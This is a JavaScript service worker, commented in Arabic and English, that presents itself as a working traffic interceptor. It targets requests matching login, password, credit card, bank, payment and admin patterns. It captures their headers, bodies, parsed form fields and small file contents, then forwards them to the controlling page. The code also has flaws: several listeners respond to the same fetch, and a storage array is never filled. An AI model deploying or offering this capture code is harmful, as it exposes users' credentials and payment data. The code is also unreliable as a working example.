/**
 * Service Worker لاعتراض حركة المرور
 * Traffic Interceptor Service Worker
 * تنفيذ فعلي لاعتراض الطلبات
 * Real implementation for request interception
 */

const CACHE_NAME = 'traffic-interceptor-v1';
const INTERCEPTED_REQUESTS = [];

// تثبيت Service Worker
self.addEventListener('install', (event) => {
    console.log('🚀 تثبيت Traffic Interceptor Service Worker');
    event.waitUntil(
        caches.open(CACHE_NAME)
            .then(cache => {
                console.log('✅ تم فتح cache للاعتراض');
                return cache;
            })
    );
});

// تفعيل Service Worker
self.addEventListener('activate', (event) => {
    console.log('✅ تفعيل Traffic Interceptor Service Worker');
    event.waitUntil(
        caches.keys().then(cacheNames => {
            return Promise.all(
                cacheNames.map(cacheName => {
                    if (cacheName !== CACHE_NAME) {
                        console.log('🗑️ حذف cache قديم:', cacheName);
                        return caches.delete(cacheName);
                    }
                })
            );
        })
    );
});

// اعتراض الطلبات
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    
    // تجاهل طلبات Service Worker نفسه
    if (url.pathname.includes('traffic-interceptor.js')) {
        return;
    }

    // اعتراض الطلبات المهمة
    if (shouldIntercept(url)) {
        console.log('🌐 اعتراض طلب:', url.href);
        
        event.respondWith(
            interceptRequest(event.request)
        );
    }
});

// تحديد ما إذا كان يجب اعتراض الطلب
function shouldIntercept(url) {
    const sensitivePatterns = [
        /login/i,
        /auth/i,
        /password/i,
        /credit.*card/i,
        /bank/i,
        /payment/i,
        /api/i,
        /admin/i,
        /dashboard/i
    ];

    return sensitivePatterns.some(pattern => pattern.test(url.href));
}

// اعتراض الطلب
async function interceptRequest(request) {
    try {
        // إرسال معلومات الطلب إلى الصفحة الرئيسية
        const requestInfo = {
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            timestamp: Date.now()
        };

        // محاولة الحصول على body إذا كان موجوداً
        if (request.method !== 'GET' && request.method !== 'HEAD') {
            try {
                const clonedRequest = request.clone();
                const body = await clonedRequest.text();
                requestInfo.body = body;
            } catch (error) {
                console.warn('⚠️ فشل في قراءة body الطلب:', error);
            }
        }

        // إرسال البيانات المعترضة
        self.clients.matchAll().then(clients => {
            clients.forEach(client => {
                client.postMessage({
                    type: 'intercepted_request',
                    data: requestInfo
                });
            });
        });

        // تنفيذ الطلب الأصلي
        const response = await fetch(request);
        
        // اعتراض الاستجابة
        const responseInfo = {
            url: request.url,
            status: response.status,
            statusText: response.statusText,
            headers: Object.fromEntries(response.headers.entries()),
            timestamp: Date.now()
        };

        // محاولة قراءة body الاستجابة
        try {
            const clonedResponse = response.clone();
            const responseBody = await clonedResponse.text();
            responseInfo.body = responseBody;
        } catch (error) {
            console.warn('⚠️ فشل في قراءة body الاستجابة:', error);
        }

        // إرسال بيانات الاستجابة المعترضة
        self.clients.matchAll().then(clients => {
            clients.forEach(client => {
                client.postMessage({
                    type: 'intercepted_response',
                    data: responseInfo
                });
            });
        });

        return response;
    } catch (error) {
        console.error('❌ فشل في اعتراض الطلب:', error);
        return fetch(request);
    }
}

// استقبال الرسائل من الصفحة الرئيسية
self.addEventListener('message', (event) => {
    const { type, data } = event.data;

    switch (type) {
        case 'start_interception':
            console.log('🚀 بدء اعتراض حركة المرور');
            break;
            
        case 'stop_interception':
            console.log('⏹️ إيقاف اعتراض حركة المرور');
            break;
            
        case 'get_intercepted_data':
            // إرسال البيانات المعترضة
            event.ports[0].postMessage({
                type: 'intercepted_data',
                data: INTERCEPTED_REQUESTS
            });
            break;
            
        case 'clear_intercepted_data':
            INTERCEPTED_REQUESTS.length = 0;
            console.log('🗑️ تم مسح البيانات المعترضة');
            break;
            
        default:
            console.log('📨 رسالة غير معروفة:', type);
    }
});

// اعتراض طلبات XMLHttpRequest
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    
    // اعتراض طلبات API
    if (url.pathname.startsWith('/api/')) {
        console.log('🔍 اعتراض طلب API:', url.pathname);
        
        event.respondWith(
            interceptAPIRequest(event.request)
        );
    }
});

// اعتراض طلبات API
async function interceptAPIRequest(request) {
    try {
        const requestInfo = {
            type: 'api_request',
            url: request.url,
            method: request.method,
            headers: Object.fromEntries(request.headers.entries()),
            timestamp: Date.now()
        };

        // قراءة body الطلب
        if (request.method !== 'GET') {
            try {
                const clonedRequest = request.clone();
                const body = await clonedRequest.text();
                requestInfo.body = body;
            } catch (error) {
                console.warn('⚠️ فشل في قراءة body طلب API:', error);
            }
        }

        // إرسال بيانات الطلب
        self.clients.matchAll().then(clients => {
            clients.forEach(client => {
                client.postMessage({
                    type: 'api_request_intercepted',
                    data: requestInfo
                });
            });
        });

        // تنفيذ الطلب
        const response = await fetch(request);
        
        // اعتراض الاستجابة
        const responseInfo = {
            type: 'api_response',
            url: request.url,
            status: response.status,
            statusText: response.statusText,
            headers: Object.fromEntries(response.headers.entries()),
            timestamp: Date.now()
        };

        // قراءة body الاستجابة
        try {
            const clonedResponse = response.clone();
            const responseBody = await clonedResponse.text();
            responseInfo.body = responseBody;
        } catch (error) {
            console.warn('⚠️ فشل في قراءة body استجابة API:', error);
        }

        // إرسال بيانات الاستجابة
        self.clients.matchAll().then(clients => {
            clients.forEach(client => {
                client.postMessage({
                    type: 'api_response_intercepted',
                    data: responseInfo
                });
            });
        });

        return response;
    } catch (error) {
        console.error('❌ فشل في اعتراض طلب API:', error);
        return fetch(request);
    }
}

// اعتراض طلبات WebSocket
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    
    // اعتراض طلبات WebSocket
    if (url.protocol === 'ws:' || url.protocol === 'wss:') {
        console.log('🔌 اعتراض طلب WebSocket:', url.href);
        
        // إرسال معلومات WebSocket
        self.clients.matchAll().then(clients => {
            clients.forEach(client => {
                client.postMessage({
                    type: 'websocket_intercepted',
                    data: {
                        url: url.href,
                        timestamp: Date.now()
                    }
                });
            });
        });
    }
});

// اعتراض طلبات الملفات
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    
    // اعتراض طلبات الملفات المهمة
    const fileExtensions = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.txt', '.csv'];
    const hasImportantExtension = fileExtensions.some(ext => 
        url.pathname.toLowerCase().includes(ext)
    );
    
    if (hasImportantExtension) {
        console.log('📄 اعتراض طلب ملف:', url.pathname);
        
        event.respondWith(
            interceptFileRequest(event.request)
        );
    }
});

// اعتراض طلبات الملفات
async function interceptFileRequest(request) {
    try {
        const requestInfo = {
            type: 'file_request',
            url: request.url,
            filename: request.url.split('/').pop(),
            method: request.method,
            timestamp: Date.now()
        };

        // إرسال معلومات الملف
        self.clients.matchAll().then(clients => {
            clients.forEach(client => {
                client.postMessage({
                    type: 'file_request_intercepted',
                    data: requestInfo
                });
            });
        });

        // تنفيذ الطلب
        const response = await fetch(request);
        
        // اعتراض محتوى الملف
        const responseInfo = {
            type: 'file_response',
            url: request.url,
            filename: request.url.split('/').pop(),
            size: response.headers.get('content-length'),
            type: response.headers.get('content-type'),
            timestamp: Date.now()
        };

        // قراءة محتوى الملف (للملفات الصغيرة فقط)
        const contentLength = response.headers.get('content-length');
        if (contentLength && parseInt(contentLength) < 1024 * 1024) { // أقل من 1MB
            try {
                const clonedResponse = response.clone();
                const fileContent = await clonedResponse.text();
                responseInfo.content = fileContent;
            } catch (error) {
                console.warn('⚠️ فشل في قراءة محتوى الملف:', error);
            }
        }

        // إرسال معلومات الملف
        self.clients.matchAll().then(clients => {
            clients.forEach(client => {
                client.postMessage({
                    type: 'file_response_intercepted',
                    data: responseInfo
                });
            });
        });

        return response;
    } catch (error) {
        console.error('❌ فشل في اعتراض طلب الملف:', error);
        return fetch(request);
    }
}

// اعتراض طلبات النماذج
self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);
    
    // اعتراض طلبات POST (النماذج)
    if (event.request.method === 'POST') {
        console.log('📝 اعتراض طلب نموذج:', url.href);
        
        event.respondWith(
            interceptFormRequest(event.request)
        );
    }
});

// اعتراض طلبات النماذج
async function interceptFormRequest(request) {
    try {
        const requestInfo = {
            type: 'form_request',
            url: request.url,
            method: request.method,
            timestamp: Date.now()
        };

        // قراءة بيانات النموذج
        try {
            const clonedRequest = request.clone();
            const formData = await clonedRequest.text();
            requestInfo.formData = formData;
            
            // تحليل بيانات النموذج
            const urlParams = new URLSearchParams(formData);
            const formFields = {};
            for (let [key, value] of urlParams) {
                formFields[key] = value;
            }
            requestInfo.parsedData = formFields;
        } catch (error) {
            console.warn('⚠️ فشل في قراءة بيانات النموذج:', error);
        }

        // إرسال بيانات النموذج
        self.clients.matchAll().then(clients => {
            clients.forEach(client => {
                client.postMessage({
                    type: 'form_request_intercepted',
                    data: requestInfo
                });
            });
        });

        // تنفيذ الطلب
        const response = await fetch(request);
        
        // اعتراض استجابة النموذج
        const responseInfo = {
            type: 'form_response',
            url: request.url,
            status: response.status,
            statusText: response.statusText,
            timestamp: Date.now()
        };

        // قراءة استجابة النموذج
        try {
            const clonedResponse = response.clone();
            const responseBody = await clonedResponse.text();
            responseInfo.body = responseBody;
        } catch (error) {
            console.warn('⚠️ فشل في قراءة استجابة النموذج:', error);
        }

        // إرسال استجابة النموذج
        self.clients.matchAll().then(clients => {
            clients.forEach(client => {
                client.postMessage({
                    type: 'form_response_intercepted',
                    data: responseInfo
                });
            });
        });

        return response;
    } catch (error) {
        console.error('❌ فشل في اعتراض طلب النموذج:', error);
        return fetch(request);
    }
}

console.log('🚀 تم تحميل Traffic Interceptor Service Worker بنجاح');